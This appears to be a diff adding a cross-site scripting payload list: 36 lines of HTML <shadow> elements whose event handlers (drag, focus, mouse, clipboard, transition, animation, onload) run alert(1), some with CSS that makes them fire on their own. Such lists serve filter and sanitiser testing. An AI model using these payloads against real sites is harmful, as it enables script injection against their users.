@@ -1,0 +1,36 @@
+<shadow draggable="true" ondrag="alert(1)">test</shadow>
+<shadow draggable="true" ondragend="alert(1)">test</shadow>
+<shadow draggable="true" ondragenter="alert(1)">test</shadow>
+<shadow draggable="true" ondragleave="alert(1)">test</shadow>
+<shadow draggable="true" ondragstart="alert(1)">test</shadow>
+<shadow id=x tabindex=1 onactivate=alert(1)></shadow>
+<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>
+<shadow id=x tabindex=1 onfocus=alert(1)></shadow>
+<shadow id=x tabindex=1 onfocusin=alert(1)></shadow>
+<shadow onbeforecopy="alert(1)" contenteditable>test</shadow>
+<shadow onbeforecut="alert(1)" contenteditable>test</shadow>
+<shadow onbeforepaste="alert(1)" contenteditable>test</shadow>
+<shadow onclick="alert(1)">test</shadow>
+<shadow oncontextmenu="alert(1)">test</shadow>
+<shadow oncopy="alert(1)" contenteditable>test</shadow>
+<shadow oncut="alert(1)" contenteditable>test</shadow>
+<shadow ondblclick="alert(1)">test</shadow>
+<shadow onkeydown="alert(1)" contenteditable>test</shadow>
+<shadow onkeypress="alert(1)" contenteditable>test</shadow>
+<shadow onkeyup="alert(1)" contenteditable>test</shadow>
+<shadow onmousedown="alert(1)">test</shadow>
+<shadow onmouseenter="alert(1)">test</shadow>
+<shadow onmouseleave="alert(1)">test</shadow>
+<shadow onmousemove="alert(1)">test</shadow>
+<shadow onmouseout="alert(1)">test</shadow>
+<shadow onmouseover="alert(1)">test</shadow>
+<shadow onmouseup="alert(1)">test</shadow>
+<shadow onpaste="alert(1)" contenteditable>test</shadow>
+<style>:target {color: red;}</style><shadow id=x style="transition:color 10s" ontransitioncancel=alert(1)></shadow>
+<style>:target {color:red;}</style><shadow id=x style="transition:color 1s" ontransitionend=alert(1)></shadow>
+<style>:target {transform: rotate(180deg);}</style><shadow id=x style="transition:transform 2s" ontransitionrun=alert(1)></shadow>
+<style>@keyframes slidein {}</style><shadow style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></shadow>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style="position:absolute;" onanimationcancel="alert(1)"></shadow>
+<style>@keyframes x{}</style><shadow style="animation-name:x" onanimationend="alert(1)"></shadow>
+<style>@keyframes x{}</style><shadow style="animation-name:x" onanimationstart="alert(1)"></shadow>
+<svg><shadow onload=alert(1)></shadow>
